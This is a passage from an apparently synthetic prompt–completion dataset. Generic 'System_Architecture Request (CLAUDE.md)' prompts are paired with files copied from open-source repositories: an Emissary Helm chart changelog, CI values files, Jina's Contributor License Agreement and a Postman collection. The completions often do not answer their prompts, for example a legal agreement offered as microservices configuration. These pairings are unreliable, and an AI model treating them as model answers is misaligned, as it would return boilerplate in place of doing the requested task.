variables to control how Ambassador interacts with redis. See [redis environment](https://www.getambassador.io/docs/edge-stack/latest/topics/running/environment/#redis)\n\n## v6.4.3\n\n- Upgrade Ambassador to version 1.5.2: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.4.2\n\n- Upgrade Ambassador to version 1.5.1: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.4.1\n\n- BugFix: The `PodSecurityPolicy` should not be created by default since it is a cluster-wide resource that should only be created once.\n\nIf you would like to use the default `PodSecurityPolicy`, make sure to unset `security.podSecurityPolicy` it in all other releases.\n\n## v6.4.0\n\n- Upgrade Ambassador to version 1.5.0: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- AuthService and RateLimitService are now installed in the same namespace as Ambassador.\n- Changes RBAC permissions to better support single-namespace installations and detecting getambassador.io CRDs.\n- Add option to install Service Preview components (traffic-manager, traffic-agent).\n- Add option to install ambassador-injector, alongside Service Preview.\n- Add additional security policy configurations.\n\n  `securityContext` has been deprecated in favor of `security` which allows you to set container and pod security contexts as well as a default `PodSecurityPolicy`.\n\n## v6.3.6\n\n- Switch from Quay.io to DockerHub\n\n## v6.3.5\n\n- Upgrade Ambassador to version 1.4.3: [CHANGELOG}](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.3.4\n\n- Minor bug fixes\n\n## v6.3.3\n\n- Add extra labels to ServiceMonitor: [CHANGELOG}](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.3.2\n\n- Upgrade Ambassador to version 1.4.2: [CHANGELOG}](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.3.1\n\n- Upgrade Ambassador to version 1.4.1: [CHANGELOG}](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.3.0\n\n- Adds: Option to create a ServiceMonitor for scraping via Prometheus Operator\n\n## v6.2.5\n\n- Upgrade Ambassador to version 1.4.0: [CHANGELOG}](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.2.4\n\n- Fix typing so that Helm3 doesn't complain (thanks, [Fabrice Rabaute](https://github.com/jfrabaute)!)\n\n## v6.2.3\n\n- Upgrade Ambassador to version 1.3.2.\n- Use explicit types for things like ports, so that things like `helm .. --set service.ports[0].port=80` will be integers instead of ending up as strings\n\n## v6.2.2\n\n- Upgrade Ambassador to version 1.3.1.\n- Remove unnecessary `version` field from CRDs.\n- Add static label to AES resources, to better support `edgectl install`\n\n## v6.2.1\n\n- Upgrade Ambassador to version 1.3.0.\n\n## v6.2.0\n\n- Add option to not create DevPortal routes\n\n## v6.1.5\n\n- Upgrade Ambassador to version 1.2.2.\n\n## v6.1.4\n\n- Upgrade from Ambassador 1.2.0 to 1.2.1.\n\n## v6.1.3\n\n- Upgrade from Ambassador 1.1.1 to 1.2.0.\n\n## v6.1.2\n\n- Upgrade from Ambassador 1.1.0 to 1.1.1.\n\n## v6.1.1\n\nMinor Improvements:\n\n- Adds: Option to override the name of the RBAC resources\n\n## v6.1.0\n\nMinor improvements including:\n\n- Adds: Option to set `restartPolicy`\n- Adds: Option to give the AES license key secret a custom name\n- Fixes: Assumption that the AES will be installed only from the `datawire/aes` repository. The `enableAES` flag now configures whether the AES is installed.\n- Clarification on how to install OSS\n\n## v6.0.0\n\nIntroduces Ambassador Edge Stack being installed by default.\n\n### Breaking changes\n\nAmbassador Pro support has been removed in 6.0.0. Please upgrade to the Ambassador Edge Stack.\n\n## v5.0.0\n\n### Breaking changes\n\n**Note** If upgrading an existing helm 2 installation no action is needed, previously installed CRDs will not be modified.\n\n- Helm 3 support for CRDs was added. Specifically, the CRD templates were moved to non-templated files in the `/crds` directory, and to keep Helm 2 support they are globbed from there by `/templates/crds.yaml`. However, because Helm 3 CRDs are not templated, the labels for new installations have necessarily changed\n\n## v4.0.0\n\n### Breaking Changes\n\n- Introduces the performance tuned and certified build of open source Ambassador, Ambassador core\n- The license key is now stored and read from a Kubernetes secret by default\n- Added `.Values.pro.licenseKey.secret.enabled` `.Values.pro.licenseKey.secret.create` fields to allow multiple releases in the same namespace to use the same license key secret.\n\n### Minor Changes\n\n- Introduces the ability to configure resource limits for both Ambassador Pro and it's redis instance\n- Introduces the ability to configure additional `AuthService` options (see [AuthService documentation](https://www.getambassador.io/reference/services/auth-service/))\n- The ambassador-pro-auth `AuthService` and ambassador-pro-ratelimit `RateLimitService` and now created as CRDs when `.Values.crds.enabled: true`\n- Fixed misnamed selector for redis instance that failed in an edge case\n- Exposes annotations for redis deployment and service\n\n## v3.0.0\n\n### Breaking Changes\n\n- The default annotation has been removed. The service port will be set dynamically to 8080 or 8443 for http and https respectively.\n- `service.http`, `service.https`, and `additionalTCPPort` has been replaced with `service.ports`.\n- `rbac.namespaced` has been removed. Use `scope.singleNamespace` instead.\n\n### Minor Changes\n\n- Ambassador Pro will pick up when `AMBASSADOR_ID` is set in `.Values.env` [[#15025]](https://github.com/helm/charts/issues/15025).\n- `{{release name}}-admins` has been renamed to `{{release name}}-admin` to match YAML install templates\n- RBAC configuration has been updated to allow for CRD use when `scope.singleNamespace: true`. [[ambassador/#1576]](https://github.com/datawire/ambassador/issues/1576)\n- RBAC configuration now allows for multiple Ambassadors to use CRDs. Set `crds.enabled` in releases that expect CRDs [[ambassador/#1679]](https://github.com/datawire/ambassador/issues/1679)\n\n## v2.6.0\n\n### Minor Changes\n\n- Add ambassador CRDs!\n- Update ambassador to 0.70.0\n\n## v2.5.1\n\n### Minor Changes\n\n- Update ambassador to 0.61.1\n\n## v2.5.0\n\n### Minor Changes\n\n- Add support for autoscaling using HPA, see `autoscaling` values.\n\n## v2.4.1\n\n### Minor Changes\n\n- Update ambassador to 0.61.0\n\n## v2.4.0\n\n### Minor Changes\n\n- Allow configuring `hostNetwork` and `dnsPolicy`\n\n## v2.3.1\n\n### Minor Changes\n\n- Adds HOST_IP environment variable\n\n## v2.3.0\n\n### Minor Changes\n\n- Adds support for init containers using `initContainers` and pod labels `podLabels`\n\n## v2.2.5\n\n### Minor Changes\n\n- Update ambassador to 0.60.3\n\n## v2.2.4\n\n### Minor Changes\n\n- Add support for Ambassador PRO [see readme](https://github.com/helm/charts/blob/master/stable/ambassador/README.md#ambassador-pro)\n\n## v2.2.3\n\n### Minor Changes\n\n- Update ambassador to 0.60.2\n\n## v2.2.2\n\n### Minor Changes\n\n- Update ambassador to 0.60.1\n\n## v2.2.1\n\n### Minor Changes\n\n- Fix RBAC for ambassador 0.60.0\n\n## v2.2.0\n\n### Minor Changes\n\n- Update ambassador to 0.60.0\n\n## v2.1.0\n\n### Minor Changes\n\n- Added `scope.singleNamespace` for configuring ambassador to run in single namespace\n\n## v2.0.2\n\n### Minor Changes\n\n- Update ambassador to 0.53.1\n\n## v2.0.1\n\n### Minor Changes\n\n- Update ambassador to 0.52.0\n\n## v2.0.0\n\n### Major Changes\n\n- Removed `ambassador.id` and `namespace.single` in favor of setting environment variables.\n\n## v1.1.5\n\n### Minor Changes\n\n- Update ambassador to 0.50.3\n\n## v1.1.4\n\n### Minor Changes\n\n- support targetPort specification\n\n## v1.1.3\n\n### Minor Changes\n\n- Update ambassador to 0.50.2\n\n## v1.1.2\n\n### Minor Changes\n\n- Add additional chart maintainer\n\n## v1.1.1\n\n### Minor Changes\n\n- Default replicas -> 3\n\n## v1.1.0\n\n### Minor Changes\n\n- Allow RBAC to be namespaced (`rbac.namespaced`)\n\n## v1.0.0\n\n### Major Changes\n\n- First release of Ambassador Helm Chart in helm/charts\n- For migration see [Migrating from datawire/ambassador chart](https://github.com/helm/charts/tree/master/stable/ambassador#migrating-from-datawireambassador-chart-chart-version-0400-or-0500)\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "charts/emissary-ingress/CHANGELOG.md", "language": "markdown", "complexity": "complex", "star_count": 4436, "quality_score": 0.69, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 733}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "deploymentStrategy:\n  type: Recreate\n\nservice:\n  type: NodePort\n\nautoscaling:\n  enabled: true\ncreateDefaultListeners: true\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "charts/emissary-ingress/ci.in/06-hpa-values.yaml", "language": "yaml", "complexity": "simple", "star_count": 4436, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 10}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "service:\n  type: NodePort\n\ndeploymentStrategy:\n  type: Recreate\n\nscope:\n  singleNamespace: true\ncreateDefaultListeners: true\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "charts/emissary-ingress/ci.in/08-single-namespace-values.yaml", "language": "yaml", "complexity": "simple", "star_count": 4436, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 10}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "service:\n  type: NodePort\n\nredis:\n  enabled: false\n  # Annotations for Ambassador Pro's redis instance.\n\ndeploymentStrategy:\n  type: Recreate\ncreateDefaultListeners: true\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "charts/emissary-ingress/ci.in/09-redis-false-values.yaml", "language": "yaml", "complexity": "simple", "star_count": 4436, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 11}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "service:\n  type: NodePort\n\ndeploymentStrategy:\n  type: RollingUpdate\n\ndaemonSet: true\n\ncreateDefaultListeners: true\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "charts/emissary-ingress/ci.in/12-daemonset-values.yaml", "language": "yaml", "complexity": "simple", "star_count": 4436, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 10}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contributor License Agreement\n\nThank you for your interest in contributing to software projects \nmanaged by Jina AI Limited (\"JINA\", \"We\" or \"Us\"). In order to \nclarify the intellectual property license granted with Contributions \nfrom any person or entity, JINA\nmust have a Contributor License Agreement (\"CLA\") on file that has\nbeen signed by each Contributor, indicating agreement to the license\nterms below. This license is for your protection as a Contributor as\nwell as the protection of JINA and its users; it does not\nchange your rights to use your own Contributions for any other purpose.\n\n\nYou accept and agree to the following terms and conditions for Your\npresent and future Contributions submitted to JINA.\n\n\n1. Definitions.\n \"You\" (or \"Your\") shall mean the copyright owner or legal entity\n authorized by the copyright owner that is making this Agreement\n with JINA. For legal entities, the entity making a\n Contribution and all other entities that control, are controlled\n by, or are under common control with that entity are considered to\n be a single Contributor. For the purposes of this definition,\n \"control\" means (i) the power, direct or indirect, to cause the\n direction or management of such entity, whether by contract or\n otherwise, or (ii) ownership of fifty percent (50%) or more of the\n outstanding shares, or (iii) beneficial ownership of such entity.\n \"Contribution\" shall mean any original work of authorship,\n including any modifications or additions to an existing work, that\n is intentionally submitted by You to JINA for inclusion\n in, or documentation of, any of the products owned or managed by\n JINA (the \"Work\"). For the purposes of this definition,\n \"submitted\" means any form of electronic, verbal, or written\n communication sent to JINA or its representatives,\n including but not limited to communication on electronic mailing\n lists, source code control systems, and issue tracking systems that\n are managed by, or on behalf of, JINA for the purpose of\n discussing and improving the Work, but excluding communication that\n is conspicuously marked or otherwise designated in writing by You\n as \"Not a Contribution.\"\n \n \n2. Grant of Copyright License. Subject to the terms and conditions of\n this Agreement, You hereby grant to JINA and to\n recipients of software distributed by JINA a perpetual,\n worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n copyright license to reproduce, prepare derivative works of,\n publicly display, publicly perform, sublicense, and distribute Your\n Contributions and such derivative works.\n \n \n3. Grant of Patent License. Subject to the terms and conditions of\n this Agreement, You hereby grant to JINA and to\n recipients of software distributed by JINA a perpetual,\n worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n (except as stated in this section) patent license to make, have\n made, use, offer to sell, sell, import, and otherwise transfer the\n Work, where such license applies only to those patent claims\n licensable by You that are necessarily infringed by Your\n Contribution(s) alone or by combination of Your Contribution(s)\n with the Work to which such Contribution(s) was submitted. If any\n entity institutes patent litigation against You or any other entity\n (including a cross-claim or counterclaim in a lawsuit) alleging\n that your Contribution, or the Work to which you have contributed,\n constitutes direct or contributory patent infringement, then any\n patent licenses granted to that entity under this Agreement for\n that Contribution or Work shall terminate as of the date such\n litigation is filed.\n \n \n4. You represent that you are legally entitled to grant the above\n license. If your employer(s) has rights to intellectual property\n that you create that includes your Contributions, you represent\n that you have received permission to make Contributions on behalf\n of that employer, that your employer has waived such rights for\n your Contributions to JINA, or that your employer has\n executed a separate Corporate CLA with JINA.\n \n \n5. You represent that each of Your Contributions is Your original\n creation (see section 7 for submissions on behalf of others). You\n represent that Your Contribution submissions include complete\n details of any third-party license or other restriction (including,\n but not limited to, related patents and trademarks) of which you\n are personally aware and which are associated with any part of Your\n Contributions.\n \n \n6. You are not expected to provide support for Your Contributions,\n except to the extent You desire to provide support. You may provide\n support for free, for a fee, or not at all. Unless required by\n applicable law or agreed to in writing, You provide Your\n Contributions on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS\n OF ANY KIND, either express or implied, including, without\n limitation, any warranties or conditions of TITLE, NON-\n INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A PARTICULAR PURPOSE.\n \n \n7. Should You wish to submit work that is not Your original creation,\n You may submit it to JINA separately from any\n Contribution, identifying the complete details of its source and of\n any license or other restriction (including, but not limited to,\n related patents, trademarks, and license agreements) of which you\n are personally aware, and conspicuously marking the work as\n \"Submitted on behalf of a third-party: [named here]\".\n \n \n8. You agree to notify JINA of any facts or circumstances of\n which you become aware that would make these representations\n inaccurate in any respect.", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/CLA.md", "language": "markdown", "complexity": "medium", "star_count": 21665, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 111}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "{\n\t\"info\": {\n\t\t\"_postman_id\": \"07347dcc-60a8-4795-8a6c-13dcb4d36037\",\n\t\t\"name\": \"Jina\",\n\t\t\"description\": \"### \\n\\nDebug\\n\\nDebugging interface. In production, you should hide them by setting **`--no-debug-endpoints`** in **`Flow`**/**`Gateway`**.\",\n\t\t\"schema\": \"https://schema.getpostman.com/json/collection/v2.1.0/collection.json\"\n\t},\n\t\"item\": [\n\t\t{\n\t\t\t\"name\": \"Debug\",\n\t\t\t\"item\": [\n\t\t\t\t{\n\t\t\t\t\t\"name\": \"status - Get the status of Jina service\",\n\t\t\t\t\t\"request\": {\n\t\t\t\t\t\t\"method\": \"GET\",\n\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}/status\",\n\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"port\": \"{{port}}\",\n\t\t\t\t\t\t\t\"path\": [\n\t\t\t\t\t\t\t\t\"status\"\n\t\t\t\t\t\t\t]\n\t\t\t\t\t\t},\n\t\t\t\t\t\t\"description\": \"Get the status of this Jina service.\\n\\nThis is equivalent to running **`jina -vf`** from command line.\"\n\t\t\t\t\t},\n\t\t\t\t\t\"response\": [\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\"name\": \"200 - Successful Response\",\n\t\t\t\t\t\t\t\"originalRequest\": {\n\t\t\t\t\t\t\t\t\"method\": \"GET\",\n\t\t\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}/status\",\n\t\t\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\t\t\"port\": \"{{port}}\",\n\t\t\t\t\t\t\t\t\t\"path\": [\n\t\t\t\t\t\t\t\t\t\t\"status\"\n\t\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\"status\": \"OK\",\n\t\t\t\t\t\t\t\"code\": 200,\n\t\t\t\t\t\t\t\"_postman_previewlanguage\": \"json\",\n\t\t\t\t\t\t\t\"header\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"key\": \"Accept\",\n\t\t\t\t\t\t\t\t\t\"value\": \"application/json\",\n\t\t\t\t\t\t\t\t\t\"description\": \"\",\n\t\t\t\t\t\t\t\t\t\"type\": \"text\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"cookie\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"expires\": \"Invalid Date\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"body\": \"{\\n    \\\"jina\\\": {},\\n    \\\"envs\\\": {},\\n    \\\"usedMemory\\\": \\\"string\\\"\\n}\"\n\t\t\t\t\t\t}\n\t\t\t\t\t]\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\t\"name\": \"post - Post a data request to some endpoint\",\n\t\t\t\t\t\"request\": {\n\t\t\t\t\t\t\"method\": \"POST\",\n\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\"body\": {\n\t\t\t\t\t\t\t\"mode\": \"raw\",\n\t\t\t\t\t\t\t\"raw\": \"{\\r\\n  \\\"data\\\": [\\r\\n    {\\r\\n      \\\"id\\\": \\\"b590b7a9aa8d1a004cc1788bbd721c25\\\",\\r\\n      \\\"text\\\": \\\"hello, world!\\\"\\r\\n    }\\r\\n  ],\\r\\n  \\\"targetExecutor\\\": \\\"\\\",\\r\\n  \\\"parameters\\\": {},\\r\\n  \\\"execEndpoint\\\": \\\"/foo\\\"\\r\\n}\",\n\t\t\t\t\t\t\t\"options\": {\n\t\t\t\t\t\t\t\t\"raw\": {\n\t\t\t\t\t\t\t\t\t\"language\": \"json\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t},\n\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}/post\",\n\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"port\": \"{{port}}\",\n\t\t\t\t\t\t\t\"path\": [\n\t\t\t\t\t\t\t\t\"post\"\n\t\t\t\t\t\t\t]\n\t\t\t\t\t\t},\n\t\t\t\t\t\t\"description\": \"Post a data request to some endpoint.\\n\\nThis is equivalent to the following:\\n\\n```\\nfrom jina import Flow\\n\\nf = Flow().add(...)\\n\\nwith f:\\n    f.post(endpoint, ...)\\n```\"\n\t\t\t\t\t},\n\t\t\t\t\t\"response\": [\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\"name\": \"200 - Successful Response\",\n\t\t\t\t\t\t\t\"originalRequest\": {\n\t\t\t\t\t\t\t\t\"method\": \"POST\",\n\t\t\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\t\t\"body\": {\n\t\t\t\t\t\t\t\t\t\"mode\": \"raw\",\n\t\t\t\t\t\t\t\t\t\"raw\": \"{\\r\\n  \\\"data\\\": [\\r\\n    {\\r\\n      \\\"id\\\": \\\"b590b7a9aa8d1a004cc1788bbd721c25\\\",\\r\\n      \\\"text\\\": \\\"hello, world!\\\"\\r\\n    }\\r\\n  ],\\r\\n  \\\"targetExecutor\\\": \\\"\\\",\\r\\n  \\\"parameters\\\": {},\\r\\n  \\\"execEndpoint\\\": \\\"/foo\\\"\\r\\n}\",\n\t\t\t\t\t\t\t\t\t\"options\": {\n\t\t\t\t\t\t\t\t\t\t\"raw\": {\n\t\t\t\t\t\t\t\t\t\t\t\"language\": \"json\"\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}/post\",\n\t\t\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\t\t\"port\": \"{{port}}\",\n\t\t\t\t\t\t\t\t\t\"path\": [\n\t\t\t\t\t\t\t\t\t\t\"post\"\n\t\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\"status\": \"OK\",\n\t\t\t\t\t\t\t\"code\": 200,\n\t\t\t\t\t\t\t\"_postman_previewlanguage\": \"json\",\n\t\t\t\t\t\t\t\"header\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"key\": \"Accept\",\n\t\t\t\t\t\t\t\t\t\"value\": \"application/json\",\n\t\t\t\t\t\t\t\t\t\"description\": \"\",\n\t\t\t\t\t\t\t\t\t\"type\": \"text\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"cookie\": [],\n\t\t\t\t\t\t\t\"body\": \"{\\n    \\\"header\\\": {\\n        \\\"requestId\\\": \\\"\\\",\\n        \\\"status\\\": {\\n            \\\"code\\\": 0,\\n            \\\"description\\\": \\\"\\\",\\n            \\\"exception\\\": {\\n                \\\"name\\\": \\\"\\\",\\n                \\\"args\\\": [],\\n                \\\"stacks\\\": [],\\n                \\\"executor\\\": \\\"\\\"\\n            }\\n        },\\n        \\\"execEndpoint\\\": \\\"\\\",\\n        \\\"targetExecutor\\\": \\\"\\\",\\n        \\\"timeout\\\": 0\\n    },\\n    \\\"parameters\\\": {},\\n    \\\"routes\\\": [\\n        {\\n            \\\"executor\\\": \\\"\\\",\\n            \\\"startTime\\\": \\\"2022-04-11T14:46:23.820Z\\\",\\n            \\\"endTime\\\": \\\"2022-04-11T14:46:23.820Z\\\",\\n            \\\"status\\\": {\\n                \\\"code\\\": 0,\\n                \\\"description\\\": \\\"\\\",\\n                \\\"exception\\\": {\\n                    \\\"name\\\": \\\"\\\",\\n                    \\\"args\\\": [],\\n                    \\\"stacks\\\": [],\\n                    \\\"executor\\\": \\\"\\\"\\n                }\\n            }\\n        }\\n    ],\\n    \\\"data\\\": [\\n        {\\n            \\\"id\\\": \\\"string\\\",\\n            \\\"parent_id\\\": \\\"string\\\",\\n            \\\"granularity\\\": 0,\\n            \\\"adjacency\\\": 0,\\n            \\\"blob\\\": \\\"string\\\",\\n            \\\"tensor\\\": \\\"string\\\",\\n            \\\"mime_type\\\": \\\"string\\\",\\n            \\\"text\\\": \\\"string\\\",\\n            \\\"weight\\\": 0,\\n            \\\"uri\\\": \\\"string\\\",\\n            \\\"tags\\\": {\\n                \\\"additionalProp1\\\": true,\\n                \\\"additionalProp2\\\": true,\\n                \\\"additionalProp3\\\": true\\n            },\\n            \\\"offset\\\": 0,\\n            \\\"location\\\": [\\n                0\\n            ],\\n            \\\"embedding\\\": \\\"string\\\",\\n            \\\"modality\\\": \\\"string\\\",\\n            \\\"evaluations\\\": {\\n                \\\"additionalProp1\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                },\\n                \\\"additionalProp2\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                },\\n                \\\"additionalProp3\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                }\\n            },\\n            \\\"scores\\\": {\\n                \\\"additionalProp1\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                },\\n                \\\"additionalProp2\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                },\\n                \\\"additionalProp3\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                }\\n            },\\n            \\\"chunks\\\": [\\n                \\\"string\\\"\\n            ],\\n            \\\"matches\\\": [\\n                \\\"string\\\"\\n            ]\\n        }\\n    ]\\n}\"\n\t\t\t\t\t\t},\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\"name\": \"422 Validation Error\",\n\t\t\t\t\t\t\t\"originalRequest\": {\n\t\t\t\t\t\t\t\t\"method\": \"POST\",\n\t\t\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\t\t\"body\": {\n\t\t\t\t\t\t\t\t\t\"mode\": \"raw\",\n\t\t\t\t\t\t\t\t\t\"raw\": \"{\\r\\n  \\\"data\\\": [\\r\\n    {\\r\\n      \\\"id\\\": \\\"b590b7a9aa8d1a004cc1788bbd721c25\\\",\\r\\n      \\\"text\\\": \\\"hello, world!\\\"\\r\\n    }\\r\\n  ],\\r\\n  \\\"targetExecutor\\\": \\\"\\\",\\r\\n  \\\"parameters\\\": {},\\r\\n  \\\"execEndpoint\\\": \\\"/foo\\\"\\r\\n}\",\n\t\t\t\t\t\t\t\t\t\"options\": {\n\t\t\t\t\t\t\t\t\t\t\"raw\": {\n\t\t\t\t\t\t\t\t\t\t\t\"language\": \"json\"\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}/post\",\n\t\t\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\t\t\"port\": \"{{port}}\",\n\t\t\t\t\t\t\t\t\t\"path\": [\n\t\t\t\t\t\t\t\t\t\t\"post\"\n\t\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\"status\": \"Unprocessable Entity (WebDAV) (RFC 4918)\",\n\t\t\t\t\t\t\t\"code\": 422,\n\t\t\t\t\t\t\t\"_postman_previewlanguage\": \"json\",\n\t\t\t\t\t\t\t\"header\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"key\": 